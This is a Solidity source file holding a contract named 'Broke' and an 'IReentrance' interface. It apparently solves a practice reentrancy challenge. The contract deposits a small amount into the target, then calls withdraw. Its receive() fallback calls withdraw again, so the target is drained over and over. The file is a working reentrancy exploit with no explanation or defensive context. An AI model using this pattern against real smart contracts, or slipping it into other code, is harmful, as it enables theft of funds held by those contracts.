// SPDX-License-Identifier: MIT
pragma solidity ^0.8;
import "./IReentrance.sol";

contract Broke {
    IReentrance public reetrance;

    constructor(IReentrance _reetrance) payable {
        reetrance = _reetrance;
    }

    function deposit() public payable {
        reetrance.donate{value: 1000000000000000}(address(this));
    }

    function getMoney() public {
        reetrance.withdraw(1000000000000000);
    }

    receive() external payable {
        getMoney();
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}